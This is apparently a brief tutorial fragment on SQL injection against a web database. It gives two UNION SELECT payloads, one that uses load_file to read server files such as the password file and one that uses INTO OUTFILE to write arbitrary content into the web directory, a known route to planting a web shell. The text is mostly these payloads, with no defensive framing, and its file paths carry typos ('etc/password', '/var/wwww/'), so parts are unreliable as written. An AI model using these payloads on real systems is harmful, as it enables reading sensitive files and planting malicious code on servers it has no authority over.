After everything we have done so far we should already know how many union selection are there
We are going to use a new function called load file,
union select null, load_file('etc/password'), null, null, null#
We can read anything on the server if that worked

Lets try to write on the server by,
union select null, 'INPUT', null, null, null into outfile '/var/wwww/'#

the input is whatever will be written and the end is the location
